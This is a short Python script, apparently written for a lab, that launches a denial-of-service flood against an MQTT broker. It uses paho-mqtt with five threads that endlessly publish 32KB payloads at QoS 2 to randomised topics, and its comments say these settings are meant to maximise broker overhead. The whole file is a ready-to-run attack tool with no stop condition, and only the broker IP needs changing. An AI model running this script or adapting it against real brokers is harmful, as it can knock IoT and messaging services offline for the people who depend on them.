import paho.mqtt.client as mqtt
import threading
import time
import random
import string

# Broker Configuration
BROKER_IP = "172.20.10.7"  # Replace with your broker's IP
PORT = 1883  # Default MQTT port (unencrypted)

# Flood Settings
BASE_TOPIC = "test/flood"
PAYLOAD_SIZE = 32368  # Large payload to increase broker load
NUM_THREADS = 5  # Number of concurrent publishing threads

# Generate a random string of given length
def random_string(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

# MQTT Publishing Function
def publish_flood():
    client = mqtt.Client()
    client.connect(BROKER_IP, PORT, 60)
    
    while True:
        topic = f"{BASE_TOPIC}/{random_string(5)}"  # Randomizing topic names
        payload = "X" * PAYLOAD_SIZE  # Large payload
        client.publish(topic, payload, qos=2)  # High QoS for broker processing overhead
        print(f"Sent {len(payload)} bytes to topic: {topic}")

# Launch multiple threads for maximum flooding
threads = []
for _ in range(NUM_THREADS):
    thread = threading.Thread(target=publish_flood)
    thread.daemon = True
    thread.start()
    
print("MQTT Flood Attack Started!")
while True:
    time.sleep(1)  # Keep main thread alive
